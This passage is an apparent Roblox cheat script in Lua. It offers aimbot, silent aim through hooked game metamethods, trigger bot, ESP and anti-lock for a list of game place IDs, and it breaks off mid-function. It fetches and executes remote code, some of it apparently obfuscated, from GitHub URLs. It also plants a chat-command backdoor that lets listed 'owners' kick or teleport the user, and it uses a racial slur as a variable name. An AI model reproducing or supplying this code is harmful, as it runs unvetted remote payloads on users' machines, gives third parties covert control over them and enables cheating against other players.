--[[xshoty free skids for ur ai coded gui]]


loadstring(game:HttpGet("https://raw.githubusercontent.com/khenn791/script-khen/refs/heads/main/larplarpbypasser.txt"))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/aa8283/i/refs/heads/main/Protected_2547730226887233.txt"))()


local repo = "https://raw.githubusercontent.com/khen791/library/main/"

local Library = loadstring(game:HttpGet(repo .. "Library.lua..txt"))()

local ThemeManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/heckerv2359/62772727/refs/heads/main/theme.lua"))()

local SaveManager = loadstring(game:HttpGet(repo .. "nini/SaveManager.lua"))()


local Window = Library:CreateWindow({
	Title = 'SIDED HUMANS',
	Center = true,
	AutoShow = false,
})


local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local owners = {
	"1",
	"2",  
	"3"
}

function x1y2z3(owner)
	if owner then
		localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
	end
end

function a1b2c3(ownerName)
	local owner

	for _, player in ipairs(Players:GetPlayers()) do
		if player.Name == ownerName then
			owner = player
			break
		end
	end

	if owner then
		owner.Chatted:Connect(function(message)
			if message == "/kick ." then
				localPlayer:Kick("Admins Has Kicked You.")
			elseif message == "/bring ." then
				x1y2z3(owner)
			end
		end)
	end
end

for _, ownerName in ipairs(owners) do
	a1b2c3(ownerName)
end

local Tabs = {
	Main = Window:AddTab('Main'),
	Misc = Window:AddTab('Misc'),
	Misc2 = Window:AddTab('Misc2'),
	Settings = Window:AddTab('Settings'),
	Config = Window:AddTab('Config'),
}



Library:OnUnload(function()

	print('Unloaded!')
	Library.Unloaded = true
end)

local LeftGroupBox = Tabs.Main:AddLeftGroupbox('General Settings')



getgenv().Psalms = {
	Enabled = true,
	HorizontalPrediction = 0.1,
	VerticalPrediction = 0.1,
	jumpoffset = -1,
	ResolverEnabled = false,
	ResolverType = "Recalculate",
	SelectedPart = "HumanoidRootPart",
	AutoPrediction = true,
	AutoPredMode = "PingBased",  
	Macro = "OFF", -- OFF or ON
	ShootDelay = 0.22,
	NoGroundShot = true,
	AutoAir = false,
	LookAt = false,
	smoothness = 0.900,
	TracerEnabled = false,
    AutoUnlock = true,
    UseMouseHit = false,
	BoxESP = false,
	NameESP = false,
	HealthESP = false,
	TracerESP = false,
	DistanceESP = false,
	SilentHorizontalPrediction = 0.1,
	SilentVerticalPrediction = 0.1,
	SilentSelectedPart = "HumanoidRootPart",
	TriggerEnabled = false,
	TriggerDelay = 0.2,
	TriggerTapDelay = 0.01,
	TriggerTolerance = 15,
	TriggerDistance = 300,
	TriggerFOVSize = 80,
	TriggerFOVShow = false,
	TriggerWallCheck = true,
	TriggerKOCheck = true,
	LockNotifications = true,
	NotificationNameType = "DisplayName",
	ClosestPartEnabled = false,
	ClosestPartMode = "Camera",
	AimTracerEnabled = false,
}


LeftGroupBox:AddToggle('Enabled', {
	Text = 'Target Lock',
	Default = getgenv().Psalms.Enabled,
	Callback = function(Value)
		getgenv().Psalms.Enabled = Value
	end
})

LeftGroupBox:AddToggle('Enabled', {
	Text = 'Tracer',
	Default = getgenv().Psalms.TracerEnabled,
	Callback = function(Value)
		getgenv().Psalms.TracerEnabled = Value
	end
})

LeftGroupBox:AddToggle('AutoUnlock', {
    Text = 'Auto Unlock',
    Default = getgenv().Psalms.AutoUnlock,
    Callback = function(Value)
        getgenv().Psalms.AutoUnlock = Value
    end
})

LeftGroupBox:AddToggle('NoGroundShot', {
	Text = 'No Ground Shot',
	Default = getgenv().Psalms.NoGroundShot,
	Callback = function(Value)
		getgenv().Psalms.NoGroundShot = Value
	end
})

LeftGroupBox:AddToggle('LookAt', {
	Text = 'Look At',
	Default = getgenv().Psalms.LookAt,
	Callback = function(Value)
		getgenv().Psalms.LookAt = Value
	end
})


local DickHead = Tabs.Main:AddLeftGroupbox('Camera')


DickHead:AddToggle('CamLock', {
	Text = 'Enable CamLock',
	Default = getgenv().Psalms.Camera,
	Callback = function(Value)
		getgenv().Psalms.Camera = Value
	end
})



DickHead:AddInput('Smoothness', {
	Default = tostring(getgenv().Psalms.smoothness),
	Numeric = true,
	Text = 'Camera Smoothness',
	Callback = function(Value)
		getgenv().Psalms.smoothness = tonumber(Value)
	end
})


local sigmaox = Tabs.Main:AddLeftGroupbox('Auto Air')



sigmaox:AddToggle('Flicker', {
	Text = 'Flick',
	Default = getgenv().Psalms.Flick,
	Callback = function(Value)
		getgenv().Psalms.Flick = Value
	end
})

sigmaox:AddToggle('Auto Air', {
	Text = 'Enable Auto Air',
	Default = getgenv().Psalms.AutoAir,
	Callback = function(Value)
		getgenv().Psalms.AutoAir = Value
	end
})

sigmaox:AddInput('ShootDelay', {
	Default = tostring(getgenv().Psalms.ShootDelay),
	Numeric = true,
	Text = 'Shoot Delay',
	Callback = function(Value)
		getgenv().Psalms.ShootDelay = tonumber(Value)
	end
})




local RightGroupBox = Tabs.Main:AddRightGroupbox('Prediction Settings')

RightGroupBox:AddInput('HorizontalPrediction', {
	Default = tostring(getgenv().Psalms.HorizontalPrediction),
	Numeric = true,
	Text = 'Horizontal Prediction',
	Callback = function(Value)
		if not getgenv().Psalms.AutoPrediction then
			getgenv().Psalms.HorizontalPrediction = tonumber(Value)
		end
	end
})

RightGroupBox:AddInput('VerticalPrediction', {
	Default = tostring(getgenv().Psalms.VerticalPrediction),
	Numeric = true,
	Text = 'Vertical Prediction',
	Callback = function(Value)
		if not getgenv().Psalms.AutoPrediction then
			getgenv().Psalms.VerticalPrediction = tonumber(Value)
		end
	end
})

RightGroupBox:AddInput('Jump Offset', {
	Default = tostring(getgenv().Psalms.jumpoffset),
	Text = 'Jump Offset',
	Callback = function(Value)
		getgenv().Psalms.jumpoffset = Value
	end
})

RightGroupBox:AddToggle('AutoPrediction', {
	Text = 'Auto Prediction',
	Default = getgenv().Psalms.AutoPrediction,
	Callback = function(Value)
		getgenv().Psalms.AutoPrediction = Value
	end
})


RightGroupBox:AddDropdown('AutoPredMode', {
	Values = { 'AdvanceCalculation', 'PingBased', 'Calculation', 'Blatant' },
	Default = getgenv().Psalms.AutoPredMode == 'PingBased' and 2 or 1,
	Text = 'Auto Prediction Mode',
	Callback = function(Value)
		getgenv().Psalms.AutoPredMode = Value
	end
})

RightGroupBox:AddDropdown('SelectedPart', {
	Values = { 'Head', 'LowerTorso', 'UpperTorso', 'HumanoidRootPart' },
	Default = getgenv().Psalms.SelectedPart == 'Head' and 1 or
		getgenv().Psalms.SelectedPart == 'LowerTorso' and 2 or
		getgenv().Psalms.SelectedPart == 'UpperTorso' and 3 or 4,
	Text = 'Target Part',
	Callback = function(Value)
		getgenv().Psalms.SelectedPart = Value
	end
})

local RightGroupBox99 = Tabs.Main:AddRightGroupbox('Silent/Target Aim')

RightGroupBox99:AddToggle('SilentAimNew', {
    Text = 'Silent Aim',
    Default = false,
    Callback = function(Value)
        getgenv().Psalms.UseMouseHitSilent = Value
    end
})

local AntiLockGroup = Tabs.Misc:AddLeftGroupbox('Anti Lock')

AntiLockGroup:AddToggle('AntiEnabled', {
	Text = 'Enable Anti Lock',
	Default = getgenv().Psalms.AntiEnabled or false,
	Callback = function(Value)
		getgenv().Psalms.AntiEnabled = Value
	end
})

AntiLockGroup:AddDropdown('SelectedMode', {
	Values = { 'Predbreaker', 'Sky', 'Ground' },
	Default = getgenv().Psalms.AntiLock == 'Predbreaker' and 1 or
	          getgenv().Psalms.AntiLock == 'Sky' and 2 or 3,
	Text = 'Anti Lock Mode',
	Callback = function(Value)
		getgenv().Psalms.AntiLock = Value
	end
})

RightGroupBox99:AddInput('SilentHorizontalPrediction', {
	Default = tostring(getgenv().Psalms.SilentHorizontalPrediction),
	Numeric = true,
	Text = 'Silent Horizontal Prediction',
	Callback = function(Value)
		getgenv().Psalms.SilentHorizontalPrediction = tonumber(Value)
	end
})

RightGroupBox99:AddInput('SilentVerticalPrediction', {
	Default = tostring(getgenv().Psalms.SilentVerticalPrediction),
	Numeric = true,
	Text = 'Silent Vertical Prediction',
	Callback = function(Value)
		getgenv().Psalms.SilentVerticalPrediction = tonumber(Value)
	end
})

RightGroupBox99:AddDropdown('SilentSelectedPart', {
	Values = { 'Head', 'LowerTorso', 'UpperTorso', 'HumanoidRootPart' },
	Default = getgenv().Psalms.SilentSelectedPart == 'Head' and 1 or
		getgenv().Psalms.SilentSelectedPart == 'LowerTorso' and 2 or
		getgenv().Psalms.SilentSelectedPart == 'UpperTorso' and 3 or 4,
	Text = 'Silent Target Part',
	Callback = function(Value)
		getgenv().Psalms.SilentSelectedPart = Value
	end
})


local ESPGroup = Tabs.Misc:AddLeftGroupbox('ESP Settings')

ESPGroup:AddToggle('BoxESP', {
	Text = 'Box ESP',
	Default = getgenv().Psalms.BoxESP,
	Callback = function(Value)
		getgenv().Psalms.BoxESP = Value
	end
})

ESPGroup:AddToggle('NameESP', {
	Text = 'Name ESP',
	Default = getgenv().Psalms.NameESP,
	Callback = function(Value)
		getgenv().Psalms.NameESP = Value
	end
})

ESPGroup:AddToggle('HealthESP', {
	Text = 'Health Bar ESP',
	Default = getgenv().Psalms.HealthESP,
	Callback = function(Value)
		getgenv().Psalms.HealthESP = Value
	end
})

ESPGroup:AddToggle('TracerESP', {
	Text = 'Tracer ESP',
	Default = getgenv().Psalms.TracerESP,
	Callback = function(Value)
		getgenv().Psalms.TracerESP = Value
	end
})

ESPGroup:AddToggle('DistanceESP', {
	Text = 'Distance ESP (Under)',
	Default = getgenv().Psalms.DistanceESP,
	Callback = function(Value)
		getgenv().Psalms.DistanceESP = Value
	end
})

local ChecksGroup = Tabs.Misc:AddLeftGroupbox('Target Checks')

ChecksGroup:AddToggle('FriendCheck', {
	Text = 'Friend Check',
	Default = getgenv().Psalms.FriendCheck,
	Callback = function(Value)
		getgenv().Psalms.FriendCheck = Value
	end
})

ChecksGroup:AddToggle('TeamCheck', {
	Text = 'Team Check',
	Default = getgenv().Psalms.TeamCheck,
	Callback = function(Value)
		getgenv().Psalms.TeamCheck = Value
	end
})

ChecksGroup:AddToggle('WallCheck', {
	Text = 'Wall Check',
	Default = getgenv().Psalms.TriggerWallCheck,
	Callback = function(Value)
		getgenv().Psalms.TriggerWallCheck = Value
	end
})


local TriggerGroup = Tabs.Misc:AddRightGroupbox('Trigger Bot')

TriggerGroup:AddToggle('TriggerEnabled', {
    Text = 'Enable Trigger Bot',
    Default = getgenv().Psalms.TriggerEnabled,
    Callback = function(Value)
        getgenv().Psalms.TriggerEnabled = Value
    end
})

TriggerGroup:AddToggle('TriggerFOVShow', {
    Text = 'Show FOV Circle',
    Default = getgenv().Psalms.TriggerFOVShow,
    Callback = function(Value)
        getgenv().Psalms.TriggerFOVShow = Value
    end
})

TriggerGroup:AddToggle('TriggerKOCheck', {
    Text = 'KO Check (don\'t shoot downed players)',
    Default = getgenv().Psalms.TriggerKOCheck,
    Callback = function(Value)
        getgenv().Psalms.TriggerKOCheck = Value
    end
})

TriggerGroup:AddInput('TriggerDelay', {
    Text = 'Shoot Delay',
    Default = tostring(getgenv().Psalms.TriggerDelay),
    Numeric = true,
    Callback = function(Value)
        getgenv().Psalms.TriggerDelay = tonumber(Value) or 0.2
    end
})

TriggerGroup:AddInput('TriggerTapDelay', {
    Text = 'Tap Delay',
    Default = tostring(getgenv().Psalms.TriggerTapDelay),
    Numeric = true,
    Callback = function(Value)
        getgenv().Psalms.TriggerTapDelay = tonumber(Value) or 0.01
    end
})

TriggerGroup:AddInput('TriggerTolerance', {
    Text = 'Tolerance (how close to crosshair)',
    Default = tostring(getgenv().Psalms.TriggerTolerance),
    Numeric = true,
    Callback = function(Value)
        getgenv().Psalms.TriggerTolerance = tonumber(Value) or 15
    end
})

TriggerGroup:AddInput('TriggerDistance', {
    Text = 'Max Distance',
    Default = tostring(getgenv().Psalms.TriggerDistance),
    Numeric = true,
    Callback = function(Value)
        getgenv().Psalms.TriggerDistance = tonumber(Value) or 300
    end
})

TriggerGroup:AddInput('TriggerFOVSize', {
    Text = 'FOV Size',
    Default = tostring(getgenv().Psalms.TriggerFOVSize),
    Numeric = true,
    Callback = function(Value)
        getgenv().Psalms.TriggerFOVSize = tonumber(Value) or 80
    end
})

local NotifyGroup = Tabs.Misc2:AddLeftGroupbox('Notifications')

NotifyGroup:AddToggle('LockNotifications', {
    Text = 'Enable Lock Notifications',
    Default = getgenv().Psalms.LockNotifications,
    Callback = function(Value)
        getgenv().Psalms.LockNotifications = Value
    end
})

NotifyGroup:AddDropdown('NotificationNameType', {
    Values = { 'DisplayName', 'Username' },
    Default = 1,
    Text = 'Show Name As',
    Callback = function(Value)
        getgenv().Psalms.NotificationNameType = Value
    end
})

local ClosestGroup = Tabs.Misc2:AddLeftGroupbox('Closest Part')

ClosestGroup:AddToggle('ClosestPartEnabled', {
    Text = 'Enable Closest Part',
    Default = getgenv().Psalms.ClosestPartEnabled,
    Callback = function(Value)
        getgenv().Psalms.ClosestPartEnabled = Value
    end
})

ClosestGroup:AddDropdown('ClosestPartMode', {
    Values = { 'Camera', 'Silent' },
    Default = getgenv().Psalms.ClosestPartMode == 'Camera' and 1 or 2,
    Text = 'Closest Part Mode',
    Callback = function(Value)
        getgenv().Psalms.ClosestPartMode = Value
    end
})

ClosestGroup:AddToggle('AimTracerEnabled', {
    Text = 'Aim Tracer',
    Default = getgenv().Psalms.AimTracerEnabled,
    Callback = function(Value)
        getgenv().Psalms.AimTracerEnabled = Value
    end
})


local ResolverGroup = Tabs.Misc2:AddRightGroupbox('Resolver')

ResolverGroup:AddToggle('ResolverEnabled', {
    Text = 'Enable Resolver',
    Default = getgenv().Psalms.ResolverEnabled,
    Callback = function(Value)
        getgenv().Psalms.ResolverEnabled = Value
    end
})

ResolverGroup:AddDropdown('ResolverType', {
    Values = { 'Recalculate', 'LookVector', 'MoveDirection', 'ZeroPrediction' },
    Default = getgenv().Psalms.ResolverType == 'Recalculate' and 1 or
              getgenv().Psalms.ResolverType == 'LookVector' and 2 or
              getgenv().Psalms.ResolverType == 'MoveDirection' and 3 or 4,
    Text = 'Resolver Type',
    Callback = function(Value)
        getgenv().Psalms.ResolverType = Value
    end
})


SaveManager:SetLibrary(Library)
ThemeManager:SetLibrary(Library)

ThemeManager:SetFolder('PONPONTheme')
SaveManager:SetFolder('PONPON')

ThemeManager:ApplyToTab(Tabs['Config'])
SaveManager:BuildConfigSection(Tabs['Config'])








game:GetService("RunService").Heartbeat:Connect(function()
	local player = game.Players.LocalPlayer
	local character = player.Character

	if character and character:FindFirstChild("HumanoidRootPart") then
		local humanoidRootPart = character.HumanoidRootPart
		local vel = humanoidRootPart.Velocity

		if getgenv().cframespeedtoggle == true then
			humanoidRootPart.CFrame = humanoidRootPart.CFrame +
				character.Humanoid.MoveDirection * getgenv().speedvalue / 0.5
		end

		if getgenv().Psalms.AntiEnabled then
			if getgenv().Psalms.AntiLock == "Predbreaker" then
				humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
			elseif getgenv().Psalms.AntiLock == "Sky" then
				humanoidRootPart.Velocity = Vector3.new(0, 100, 0)
			elseif getgenv().Psalms.AntiLock == "Ground" then
				humanoidRootPart.Velocity = Vector3.new(0, -400, 0)
			end
		end

		game:GetService("RunService").RenderStepped:Wait()
		humanoidRootPart.Velocity = vel
	end
end)


local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local dragging, dragInput, dragStart, startPos



local function createScreenGui()
	local existingGui = CoreGui:FindFirstChild("MyScreenGui")
	if existingGui then
		return existingGui
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "MyScreenGui"
	screenGui.Parent = CoreGui
	return screenGui
end

local function initializeToggleButton(screenGui)
	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0, 80, 0, 50)
	button.Position = UDim2.new(1, -97, 0, 1)
	button.Text = "PX4"
	button.TextScaled = true
	button.Font = Enum.Font.SourceSansBold
	button.TextSize = 14
	button.BackgroundColor3 = Color3.new(0, 0, 0)
	button.BackgroundTransparency = 0
	button.TextColor3 = Color3.new(1, 1, 1)
	button.BorderSizePixel = 0

	button.ClipsDescendants = true
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 20)
	corner.Parent = button

	button.Parent = screenGui

	button.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
			
			Library:Toggle()

			dragging = true
			dragStart = input.Position
			startPos = button.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	button.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
			dragInput = input
			local delta = dragInput.Position - dragStart
			button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	end)
end

local screenGui = createScreenGui()
initializeToggleButton(screenGui)


getgenv().Psalms.LockType = "Namecall"
getgenv().Psalms.RESOLVER = "MoveDirection"



local game_support = {
	[2788229376] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
	[12238627497] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
	[5602055394] = { Remote = "MAINEVENT", Argument = "MousePos" },
	[17403265390] = { Remote = "MAINEVENT", Argument = "MOUSE" },
	[17403166075] = { Remote = "MAINEVENT", Argument = "MOUSE" },
	[18111448661] = { Remote = "MAINEVENT", Argument = "MOUSE" },
	[15186202290] = { Remote = "MAINEVENT", Argument = "MOUSE" },
	[11143225577] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
	[15763494605] = { Remote = "MAINEVENT", Argument = "MOUSE" },
	[125825216602676] = { Remote = "MAINEVENT", Argument = "MOUSE" },
	[15166543806] = { Remote = "MAINEVENT", Argument = "MoonUpdateMousePos" },
	[17897702920] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
	[16033173781] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
	[7213786345] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
	[9825515356] = { Remote = "MainEvent", Argument = "MousePosUpdate" },
	[16859411452] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
	[117734153242642] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
	[14277620939] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
	[17344804827] = { Remote = "MainEvent", Argument = "UpdateMousePos" }
}




local Sigmaballs = Instance.new("ScreenGui")
Sigmaballs.Name = "PONPON"
Sigmaballs.Parent = game.CoreGui
Sigmaballs.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Sigmaballs.ResetOnSpawn = false

local ImageButton = Instance.new("TextButton")
ImageButton.Name = "lockButton"
ImageButton.Parent = Sigmaballs
ImageButton.Text = "PXTOOGLE"
ImageButton.TextColor3 = Color3.fromRGB(0, 255, 0)
ImageButton.TextScaled = true
ImageButton.Active = true
ImageButton.Draggable = true
ImageButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ImageButton.BackgroundTransparency = 0.350
ImageButton.Size = UDim2.new(0, 140, 0, 70)
ImageButton.Position = UDim2.new(0.5, 177, 0.5, -157)

local Ui2corner = Instance.new("UICorner")
Ui2corner.CornerRadius = UDim.new(0.2, 0)
Ui2corner.Parent = ImageButton


local player = game.Players.LocalPlayer
local Plr = nil
local enabled = false


local FOV43 = Drawing.new("Circle")
FOV43.Transparency = 0.5
FOV43.Thickness = 2
FOV43.Color = Color3.new(1, 0, 0)
FOV43.Filled = false
FOV43.Radius = 250
FOV43.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
FOV43.Visible = false

function SigmaOhioPlayer()
	local mouse = player:GetMouse()
	local closestPlayer
	local shortestDistance = math.huge
	local CC = game:GetService("Workspace").CurrentCamera
	local screenCenter = Vector2.new(CC.ViewportSize.X / 2, CC.ViewportSize.Y / 2)
	local fovRadius = FOV43.Radius
	local viewportSize = CC.ViewportSize

	for i, v in pairs(game.Players:GetPlayers()) do
		if v ~= player and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
			if getgenv().Psalms.FriendCheck and player:IsFriendsWith(v) then continue end
			if getgenv().Psalms.TeamCheck and v.Team and player.Team and v.Team == player.Team then continue end
			local pos, onScreen = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)

			if onScreen and pos.X > 0 and pos.Y > 0 and pos.X < viewportSize.X and pos.Y < viewportSize.Y then
				local magnitude = (Vector2.new(pos.X, pos.Y) - screenCenter).magnitude
				if magnitude < fovRadius and magnitude < shortestDistance then
					closestPlayer = v
					shortestDistance = magnitude
				end
			end
		end
	end
	return closestPlayer
end

function createTracer(localPlayer, targetPlayer)
	if localPlayer and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and
		targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

		local tracerAttachment1 = Instance.new("Attachment", localPlayer.Character.HumanoidRootPart)
		local tracerAttachment2 = Instance.new("Attachment", targetPlayer.Character.HumanoidRootPart)

		local tracerBeam = Instance.new("Beam")
		tracerBeam.Attachment0 = tracerAttachment1
		tracerBeam.Attachment1 = tracerAttachment2
		tracerBeam.Color = ColorSequence.new(Color3.fromRGB(153, 0, 153))
		tracerBeam.Width0 = 0.080
		tracerBeam.Width1 = 0.080
		tracerBeam.Parent = localPlayer.Character.HumanoidRootPart

		tracernigger = tracerBeam  

		targetPlayer.CharacterAdded:Connect(function(newCharacter)
			if tracernigger then
				tracernigger:Destroy()  
				tracernigger = nil
			end

			newCharacter:WaitForChild("HumanoidRootPart")
			tracerAttachment2.Parent = newCharacter.HumanoidRootPart
			tracernigger = tracerBeam  
		end)
	end
end

function destroyTracer()
	if tracernigger then
		tracernigger:Destroy()
		tracernigger = nil
	end
end




function LookAtPlayer(Target)
	local localChar = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
	local localHumanoidRootPart = localChar:FindFirstChild("HumanoidRootPart")

	if localHumanoidRootPart then
		if getgenv().Psalms and getgenv().Psalms.LookAt then
			if Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart") then
				local targetHumanoidRootPart = Target.Character.HumanoidRootPart

				local targetPosition = targetHumanoidRootPart.Position
				local localPosition = localHumanoidRootPart.Position

				local horizontalDirection = Vector3.new(targetPosition.X - localPosition.X, 0, targetPosition.Z - localPosition.Z).unit

				localHumanoidRootPart.CFrame = CFrame.new(localPosition, localPosition + horizontalDirection)
				localChar.Humanoid.AutoRotate = false
			end
		else
			localChar.Humanoid.AutoRotate = true
		end
	end

	if not (Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart")) then
		localChar.Humanoid.AutoRotate = true
	end
end

local function toggleLock()
	if enabled then
		enabled = false
		local oldTarget = Plr
		Plr = nil
		destroyTracer()

		if getgenv().Psalms.LockNotifications then
			local name = oldTarget and (getgenv().Psalms.NotificationNameType == "DisplayName" 
				and (oldTarget.DisplayName or oldTarget.Name) 
				or oldTarget.Name) or "Unknown"

			Library:Notify("Unlocked from: " .. name)
		end

	else

		Plr = SigmaOhioPlayer()
		if Plr then
			enabled = true
			if getgenv().Psalms.TracerEnabled then
				createTracer(game.Players.LocalPlayer, Plr)  
			end

			if getgenv().Psalms.LockNotifications then
				local name = (getgenv().Psalms.NotificationNameType == "DisplayName" 
					and (Plr.DisplayName or Plr.Name) 
					or Plr.Name)

				Library:Notify("Locked On: " .. name)
			end
		end
	end
end

ImageButton.MouseButton1Click:Connect(toggleLock)

UserInputService.InputBegan:Connect(function(input, processed)
	if not processed and input.KeyCode == Enum.KeyCode.DPadUp then
		toggleLock()
	end
end)

local function getRemoteInfo()
	local placeId = game.PlaceId
	return game_support[placeId] or { Remote = "MainEvent", Argument = "UpdateMousePos" }
end

local remoteInfo = getRemoteInfo()
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)

local Vect3 = Vector3.new


local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(...)
	local args = {...}
	local method = getnamecallmethod()

	if getgenv().Psalms.Enabled and getgenv().Psalms.LockType == "Namecall" then
		if Plr and Plr.Character and method == "FireServer" and (args[2] == remoteInfo.Argument) then
			local selectedPart = getgenv().Psalms.SelectedPart
			local targetPart = Plr.Character[selectedPart]

			if targetPart then
				local velocity = targetPart.Velocity
				if getgenv().Psalms.ResolverEnabled then
					local resolverType = getgenv().Psalms.ResolverType
						if resolverType == "Recalculate" then
							velocity = targetPart.Velocity
					elseif resolverType == "LookVector" then
						velocity = targetPart.CFrame.LookVector * getgenv().Psalms.HorizontalPrediction
					elseif resolverType == "MoveDirection" then
							velocity = Plr.Character.Humanoid.MoveDirection * Plr.Character.Humanoid.WalkSpeed
					elseif resolverType == "ZeroPrediction" then
							velocity = Vector3.new(targetPart.Velocity.X, 0, targetPart.Velocity.Z)
					end
				else
					velocity = targetPart.Velocity
				end

				local horizontalPrediction = getgenv().Psalms.HorizontalPrediction
				local verticalPrediction = getgenv().Psalms.VerticalPrediction
				local jumpOffset = getgenv().Psalms.jumpoffset or 0

				if not getgenv().Psalms.ResolverEnabled then
					args[3] = Vector3.new(
						targetPart.Position.X + (velocity.X * horizontalPrediction),
						targetPart.Position.Y + (velocity.Y * verticalPrediction) + jumpOffset,
						targetPart.Position.Z + (velocity.Z * horizontalPrediction)
					)
				else
					args[3] = targetPart.Position + (velocity or Vector3.new()) * horizontalPrediction + Vector3.new(0, jumpOffset, 0)
				end

				return old(unpack(args))
			end
		end
	end

	return old(...)
end)

setreadonly(mt, true)

local mouse = game.Players.LocalPlayer:GetMouse()
local oldIndex
oldIndex = hookmetamethod(game, "__index", newcclosure(function(t, k)
    if not checkcaller() 
        and t == mouse 
        and (k == "Hit" or k == "Target") 
        and getgenv().Psalms.UseMouseHitSilent
        and Plr 
        and Plr.Character 
        and Plr.Character:FindFirstChild(getgenv().Psalms.SelectedPart)
    then
        local partName = getgenv().Psalms.SilentSelectedPart
        local targetPart = Plr.Character[partName]
        
        if k == "Target" then
            return targetPart
        end
        local vel = targetPart.Velocity
        local hPred = getgenv().Psalms.SilentHorizontalPrediction
        local vPred = getgenv().Psalms.SilentVerticalPrediction   
        local jumpOff = getgenv().Psalms.jumpoffset or 0     
        local predX = targetPart.Position.X + (vel.X * hPred)
        local predY = targetPart.Position.Y + (vel.Y * vPred) + jumpOff
        local predZ = targetPart.Position.Z + (vel.Z * hPred)
        
        local predictedPos = Vector3.new(predX, predY, predZ)
        local rightOffset = targetPart.CFrame.RightVector * 0.3
        
        return CFrame.new(predictedPos + rightOffset)
    end
    
    return oldIndex(t, k)
end))
local Stas = game:GetService("Stats")

local RunService = game:GetService("RunService")


local Blatant = {
	{50, 0.12758545757236864},
	{60, 0.12593338424986178},
	{70, 0.1416310605747206},
	{80, 0.1441481061236737},
	{90, 0.14306050263254388},
	{100, 0.14698413210558095},
	{110, 0.14528324362031425},
	{120, 0.14556534594403},
	{130, 0.14614337395777216},
	{140, 0.14645603036905414},
	{150, 0.14736848095666674},
	{160, 0.14696985547996216},
	{170, 0.14718530231216217},
	{180, 0.1471532933015037},
	{190, 0.1471212842908452},
	{200, 0.14708927528018672},
	{210, 0.14705726626952823},
	{220, 0.14702525725886974},
	{230, 0.14699324824821125},
	{240, 0.14696123923755276},
	{250, 0.14692923022689427},
	{260, 0.14689722121623578},
	{270, 0.1468652122055773},
	{280, 0.1468332031949188},
	{290, 0.1468011941842603},
	{300, 0.1467691851736018},
}

local predictionTable = {
	{0, 0.1332},
	{10, 0.1234555},
	{20, 0.12435},
	{30, 0.124123},
	{40, 0.12766},
	{50, 0.128643},
	{60, 0.1264236},
	{70, 0.12533},
	{80, 0.1321042},
	{90, 0.1421951},
	{100, 0.134143},
	{105, 0.141199},
	{110, 0.142199},
	{125, 0.15465},
	{130, 0.12399},
	{135, 0.1659921},
	{140, 0.1659921},
	{145, 0.129934},
	{150, 0.1652131},
	{155, 0.125333},
	{160, 0.1223333},
	{165, 0.1652131},
	{170, 0.16863},
	{175, 0.16312},
	{180, 0.1632},
	{185, 0.16823},
	{190, 0.18659},
	{205, 0.17782},
	{215, 0.16937},
	{225, 0.176332},
}

local function calculateAdvancePrediction(target, cameraPosition, pingBase)
	local character = Plr.Character and Plr.Character.Parent
	if character then
		local GoodPartTheCom = character:FindFirstChild("HumanoidRootPart")
		if GoodPartTheCom then
			local Velop = GoodPartTheCom.Velocity
			local distanc11 = (cameraPosition - GoodPartTheCom.Position).Magnitude
			local advancePrediction = pingBase + (distanc11 / 1000) * (Velop.Magnitude / 50)
			return advancePrediction
		end
	end
	return pingBase
end

local function updatePredictionValue()
	if getgenv().Psalms.AutoPrediction then
		local pingValue = Stas.Network.ServerStatsItem["Data Ping"]:GetValueString()
		local split = string.split(pingValue, '(')
		local ping = tonumber(split[1])

		if ping then
			if getgenv().Psalms.AutoPredMode == "PingBased" then
				for i = 1, #predictionTable do
					if ping < predictionTable[i][1] then
						local value = predictionTable[i][2]
						getgenv().Psalms.HorizontalPrediction = value
						getgenv().Psalms.VerticalPrediction = value
						break
					end
				end
			elseif getgenv().Psalms.AutoPredMode == "Calculation" then
				local calculatedValue = 0.1 + (ping / 1000) * 0.32
				getgenv().Psalms.HorizontalPrediction = calculatedValue
				getgenv().Psalms.VerticalPrediction = calculatedValue
			elseif getgenv().Psalms.AutoPredMode == "AdvanceCalculation" then
				for i = 1, #predictionTable do
					if ping < predictionTable[i][1] then
